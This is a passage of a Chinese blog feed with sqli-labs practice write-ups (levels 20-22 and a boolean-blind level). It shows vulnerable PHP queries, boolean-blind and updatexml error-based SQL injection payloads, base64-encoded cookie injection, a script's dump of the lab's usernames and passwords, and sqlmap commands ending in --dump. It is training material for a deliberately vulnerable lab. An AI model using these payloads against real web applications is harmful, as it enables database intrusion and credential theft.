        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>?id=1'</code>没有报错显示，报错注入不能够实现注入了。<br><code>?id=1</code>显示You are in………..<br>&amp;#x20;对和错返回不同的页面回显，可以采用<strong>布尔盲注</strong>的方式， <a name="WUqxX"></a></p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p><a name="MJTYd"></a></p><h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p><code>?id=1' order by 4 --+</code>没有显示报错<br><code>?id=1' order by 3 --+</code>显示You are in<br>&amp;#x20;由此可以判断**字段数为3  ** <a name="cU19o"></a></p><h2 id="判断数据库名称长度"><a href="#判断数据库名称长度" class="headerlink" title="判断数据库名称长度"></a>判断数据库名称长度</h2><p><code>?id=-1 or length(database())&gt;8 --+</code>无内容<br><code>?id=-1 or length(database())=8</code>有内容<br>说明<strong>数据库长度为8</strong></p><blockquote><p>一般采用逻辑或，因为无法确保前面的条件一定为真</p></blockquote><p><a name="frb3M"></a></p><h3 id="逐一猜解数据库名称"><a href="#逐一猜解数据库名称" class="headerlink" title="逐一猜解数据库名称"></a>逐一猜解数据库名称</h3><p><a name="a5hHH"></a></p><h4 id="ascii表（部分）"><a href="#ascii表（部分）" class="headerlink" title="ascii表（部分）"></a>ascii表（部分）</h4><table><thead><tr><th>97</th><th>a</th></tr></thead><tbody><tr><td>98</td><td>b</td></tr><tr><td>99</td><td>c</td></tr><tr><td>100</td><td>d</td></tr><tr><td>101</td><td>e</td></tr><tr><td>102</td><td>f</td></tr><tr><td>103</td><td>g</td></tr><tr><td>104</td><td>h</td></tr><tr><td>105</td><td>i</td></tr><tr><td>106</td><td>j</td></tr><tr><td>107</td><td>k</td></tr><tr><td>108</td><td>l</td></tr><tr><td>109</td><td>m</td></tr><tr><td>110</td><td>n</td></tr><tr><td>111</td><td>o</td></tr><tr><td>112</td><td>p</td></tr><tr><td>113</td><td>q</td></tr><tr><td>114</td><td>r</td></tr><tr><td>115</td><td>s</td></tr><tr><td>116</td><td>t</td></tr><tr><td>117</td><td>u</td></tr><tr><td>118</td><td>v</td></tr><tr><td>119</td><td>w</td></tr><tr><td>120</td><td>x</td></tr><tr><td>121</td><td>y</td></tr><tr><td>122</td><td>z</td></tr></tbody></table><p><code>?id=-1' or ascii(substr(database(),1,1))&gt;115--+</code>无<br><code>?id=-1' or ascii(substr(database(),1,1))=115--+</code>有<br>第一个字符是s<br>…<br>或者<br><code> ?id=-1' or **ascii**(mid(database(),1,1))=115--+</code>有&amp;#x20;<br>…<br>或者<br><code>?id=-1' or mid(database(),1,1)='s'--+ </code>有<br>…</p><blockquote><p><strong>MID函数</strong>表示按照指定的条件对字符串进行截取。<br>语法结构：=MID(目标单元格，开始位置，截取长度)<br>注意：该函数的提取方法是从左往右提取指定的数据。</p></blockquote><br><a name="SzUFc"></a>## 猜解数据表名称`?id=-1' or ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101--+`<br>第一个字符是e<a name="Y2AQJ"></a>## 猜解字段名称  `?id=-1' or ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))=105--+`<br>第一个字符是i<a name="RNwwH"></a>## 猜解字段内容`?id=-1' or ascii(mid((select group_concat(username,0x7e,password) from users),1,1))=68--+`<br>第一个字符是D<p>对于布尔盲注的问题，一般采用脚本进行猜解或者使用sqlmap\ <a name="kRQp0"></a></p><h1 id="使用python布尔盲注脚本"><a href="#使用python布尔盲注脚本" class="headerlink" title="使用python布尔盲注脚本"></a>使用python布尔盲注脚本</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root?guoyx<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/sql-python<span class="token punctuation">]</span>└─<span class="token comment"># python3 bool-blind.py    </span><span class="token punctuation">[</span>-<span class="token punctuation">]</span>开始测试数据库名长度<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span>数据库长度：8<span class="token punctuation">[</span>-<span class="token punctuation">]</span>开始测试数据库名<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span>数据库名：security开始测试security数据库有几张表<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span>security库一共有4张表<span class="token punctuation">[</span>-<span class="token punctuation">]</span>开始猜解表名<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.第1张表名长度：6<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：emails第2张表名长度：8<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：referers第3张表名长度：7<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：uagents第4张表名长度：5<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：users<span class="token punctuation">[</span>+<span class="token punctuation">]</span>security库下的4张表：<span class="token punctuation">[</span><span class="token string">'emails'</span>, <span class="token string">'referers'</span>, <span class="token string">'uagents'</span>, <span class="token string">'users'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span>开始猜解每张表的字段数：<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span>emails表<span class="token number">2</span>个字段<span class="token punctuation">[</span>+<span class="token punctuation">]</span>referers表<span class="token number">3</span>个字段<span class="token punctuation">[</span>+<span class="token punctuation">]</span>uagents表<span class="token number">4</span>个字段<span class="token punctuation">[</span>+<span class="token punctuation">]</span>users表<span class="token number">3</span>个字段<span class="token punctuation">[</span>+<span class="token punctuation">]</span>表对应的字段数：<span class="token punctuation">[</span><span class="token number">2</span>, <span class="token number">3</span>, <span class="token number">4</span>, <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span>开始猜解每张表的字段名<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span>emails表的字段：<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：id<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：email_id<span class="token punctuation">[</span>+<span class="token punctuation">]</span>referers表的字段：<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：id<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：referer<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：ip_address<span class="token punctuation">[</span>+<span class="token punctuation">]</span>uagents表的字段：<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：id<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：uagent<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：ip_address<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：username<span class="token punctuation">[</span>+<span class="token punctuation">]</span>users表的字段：<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：id<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：username<span class="token punctuation">[</span>+<span class="token punctuation">]</span>：password<span class="token punctuation">[</span>-<span class="token punctuation">]</span>对users表的<span class="token punctuation">[</span><span class="token string">'id'</span>, <span class="token string">'username'</span>, <span class="token string">'password'</span><span class="token punctuation">]</span>字段进行爆破<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span>users表中的id字段有以下13条数据：<span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">1</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">2</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">3</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">4</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">5</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">6</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">7</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">8</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">9</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">10</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">11</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">12</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span><span class="token number">14</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span>users表中的username字段有以下13条数据：<span class="token punctuation">[</span>+<span class="token punctuation">]</span>Dumb<span class="token punctuation">[</span>+<span class="token punctuation">]</span>Angelina<span class="token punctuation">[</span>+<span class="token punctuation">]</span>Dummy<span class="token punctuation">[</span>+<span class="token punctuation">]</span>secure<span class="token punctuation">[</span>+<span class="token punctuation">]</span>stupid<span class="token punctuation">[</span>+<span class="token punctuation">]</span>superman<span class="token punctuation">[</span>+<span class="token punctuation">]</span>batman<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin1<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin2<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin3<span class="token punctuation">[</span>+<span class="token punctuation">]</span>dhakkan<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin4<span class="token punctuation">[</span>+<span class="token punctuation">]</span>users表中的password字段有以下13条数据：<span class="token punctuation">[</span>+<span class="token punctuation">]</span>Dumb<span class="token punctuation">[</span>+<span class="token punctuation">]</span>I-kill-you<span class="token punctuation">[</span>+<span class="token punctuation">]</span>p@ssword<span class="token punctuation">[</span>+<span class="token punctuation">]</span>crappy<span class="token punctuation">[</span>+<span class="token punctuation">]</span>stupidity<span class="token punctuation">[</span>+<span class="token punctuation">]</span>genious<span class="token punctuation">[</span>+<span class="token punctuation">]</span>mob<span class="token operator">!</span>le<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin1<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin2<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin3<span class="token punctuation">[</span>+<span class="token punctuation">]</span>dumbo<span class="token punctuation">[</span>+<span class="token punctuation">]</span>admin4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less22</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/less20/less22/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/less20/less22/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token variable">$uname</span> and users.password=<span class="token variable">$passwd</span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$cookee</span> <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span><span class="token variable">$cookee</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cookee1</span> <span class="token operator">=</span> <span class="token string">'"'</span><span class="token builtin class-name">.</span> <span class="token variable">$cookee</span><span class="token builtin class-name">.</span> <span class="token string">'"'</span><span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token string">"&lt;br&gt;&lt;/font&gt;"</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE username=<span class="token variable">$cookee1</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与Less21的唯一区别在于此关闭合方式为双引号”</p><p>成功登录后发现在Cookie处登录的信息被进行了加密，</p><blockquote><p>YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36<br>YOUR IP ADDRESS IS : 192.168.31.119<br>DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE<br>YOUR COOKIE : uname = YWRtaW4= and expires: Wed 16 Nov 2022 - 20:58:46<br>Your Login name:admin<br>Your Password:admin<br>Your ID:8</p></blockquote><p><a name="DsPkr"></a></p><h1 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h1><p><code>uname=admin" order by 4-- +</code><br>先将语句进行base64加密，再进行注入，<br><code>uname=YWRtaW4iIG9yZGVyIGJ5IDQtLSAr</code></p><blockquote><p>Issue with your mysql: Unknown column ‘4’ in ‘order clause’</p></blockquote><p><a name="Tcgou"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据库名<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token string">" union select 1,2,updatexml(1,concat(0x7e,database(),0x7e),1)-- +uname=YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKS0tICs=爆破数据表名uname=admin"</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema <span class="token operator">=</span> database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>-- +<span class="token assign-left variable">uname</span><span class="token operator">=</span>YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYSA9IGRhdGFiYXNlKCkpLDB4N2UpLDEpLS0gKw<span class="token operator">==</span>爆破字段名<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token string">" union select 1,2,updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 8,1),0x7e),1)-- +uname=YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCAoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnIGxpbWl0IDgsMSksMHg3ZSksMSktLSAr爆破字段uname=admin"</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select username from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>-- +<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin" union <span class="token keyword">select</span> <span class="token number">1,2</span>,updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select username from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>-- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less21</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/less20/less21/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/less20/less21/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token variable">$uname</span> and users.password=<span class="token variable">$passwd</span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE username=('<span class="token variable">$cookee</span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token string">" Your Cookie is deleted"</span><span class="token punctuation">;</span>setcookie<span class="token punctuation">(</span><span class="token string">'uname'</span>, base64_encode<span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>, time<span class="token punctuation">(</span><span class="token punctuation">)</span>-3600<span class="token punctuation">)</span><span class="token punctuation">;</span>header <span class="token punctuation">(</span><span class="token string">'Location: index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>闭合方式’)</p><p>成功登录后发现在Cookie处登录的信息被进行了加密，</p><blockquote><p>YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36<br>YOUR IP ADDRESS IS : 192.168.31.119<br>DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE<br>YOUR COOKIE : <strong>uname = YWRtaW4=</strong> and expires: Wed 16 Nov 2022 - 20:04:08<br>Your Login name:admin<br>Your Password:admin<br>Your ID:8</p></blockquote><p>说明在客户端登录的信息被进行了加密 &amp;#x20;<br>** base64解码**YWRtaW4=为admin<br>可以尝试在每次注入前对payload进行加密再注入</p><p><a name="DsPkr"></a></p><h1 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h1><p><code>uname=admin' order by 4 -- +</code><br>先将语句进行base64加密，再进行注入，<br><code>uname=YWRtaW4nIG9yZGVyIGJ5IDQgLS0gKw==</code></p><blockquote><p>Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘order by 4 – +’) LIMIT 0,1’ at line 1</p></blockquote><p>通过回显找到闭合方式为’)\ <a name="mqKGp"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据库名<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token string">') union select 1,2,updatexml(1,concat(0x7e,database(),0x7e),1)-- +uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSksMSktLSAr爆破数据表名uname=admin'</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema <span class="token operator">=</span> database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>-- +<span class="token assign-left variable">uname</span><span class="token operator">=</span>YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWEgPSBkYXRhYmFzZSgpKSwweDdlKSwxKS0tICs<span class="token operator">=</span>爆破字段名<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token string">') union select 1,2,updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='</span><span class="token function">users</span><span class="token string">' limit 8,1),0x7e),1)-- +uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgKGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX25hbWU9J3VzZXJzJyBsaW1pdCA4LDEpLDB4N2UpLDEpLS0gKw==爆破字段uname=admin'</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select username from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>-- +<span class="token assign-left variable">uname</span><span class="token operator">=</span>YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgdXNlcm5hbWUgZnJvbSB1c2VycyBsaW1pdCAwLDEpLDB4N2UpLDEpLS0gKw<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="ImHDK"></a></p><h1 id="sqlmap加密注入运用"><a href="#sqlmap加密注入运用" class="headerlink" title="sqlmap加密注入运用"></a>sqlmap加密注入运用</h1><p>将数据包头的内容重新粘贴到新的文档中，<br>在Cookie处标上*&amp;#x20;<br>启动sqlmap,对进行加密注入的数据需要用到tamper模块</p><blockquote><p><strong>–tamper=”base64encode.py”</strong></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET /less-21/index.php HTTP/1.1Host: <span class="token number">192.168</span>.31.193Upgrade-Insecure-Requests: <span class="token number">1</span>User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/101.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>Cookie: <span class="token assign-left variable">uname</span><span class="token operator">=</span>YWRtaW4%3D*Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">扫描sqlmap <span class="token parameter variable">-r</span> <span class="token number">3</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">3</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span><span class="token string">"base64encode.py"</span>爆破数据库sqlmap <span class="token parameter variable">-r</span> <span class="token number">3</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">3</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span><span class="token string">"base64encode.py"</span> --current-db爆破表单sqlmap <span class="token parameter variable">-r</span> <span class="token number">3</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">3</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span><span class="token string">"base64encode.py"</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">--tables</span>脱库sqlmap <span class="token parameter variable">-r</span> <span class="token number">3</span>.txt <span class="token parameter variable">--batch</span> <span class="token parameter variable">--level</span> <span class="token number">3</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span><span class="token string">"base64encode.py"</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less20</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/less20/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/basic-challenges/less18/less20/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token variable">$uname</span> and users.password=<span class="token variable">$passwd</span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE username='<span class="token variable">$cookee</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>登录之后发现有很明显的<strong>cookie</strong>提示</p><blockquote><p>YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36<br>YOUR IP ADDRESS IS : 192.168.31.119<br>DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE<br>YOUR COOKIE : uname = admin and expires: Wed 16 Nov 2022 - 19:23:44<br>Your Login name:admin<br>Your Password:admin<br>Your ID:8</p></blockquote><p>登录之后刷新页面，一定要保证cookie还在存在的前提下进行抓包 &amp;#x20;<br><code>uname = admin' order by 3-- +</code><br><code>uname=admin' order by 4-- +</code></p><blockquote><p>Issue with your mysql: Unknown column ‘4’ in ‘order clause’</p></blockquote><p>3个字段数 <a name="NTGzZ"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p><a name="X6iZN"></a></p><h2 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h2><p><code>uname=admin' union select 1,2,updatexml(1,concat(0x7e,database(),0x7e),1)--+</code> <a name="DoliG"></a></p><h2 id="爆破数据表名"><a href="#爆破数据表名" class="headerlink" title="爆破数据表名"></a>爆破数据表名</h2><p><code>uname=admin' union select 1,2,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)--+</code> <a name="zblHG"></a></p><h2 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h2><p><code>uname=admin' union select 1,2,updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 8,1),0x7e),1)-- +</code> <a name="IHMXL"></a></p><h2 id="爆破字段"><a href="#爆破字段" class="headerlink" title="爆破字段"></a>爆破字段</h2><p><code>uname=admin' union select 1,2,updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)-- +</code></p><p><a name="Ea4Mq"></a></p><h1 id="sqlmap-cookie注入"><a href="#sqlmap-cookie注入" class="headerlink" title="sqlmap cookie注入"></a>sqlmap cookie注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /less-20/index.php HTTP/1.1Host: <span class="token number">192.168</span>.31.193Content-Length: <span class="token number">0</span>Cache-Control: max-age<span class="token operator">=</span><span class="token number">0</span>Upgrade-Insecure-Requests: <span class="token number">1</span>User-Agent: Mozilla/5.0 <span class="token 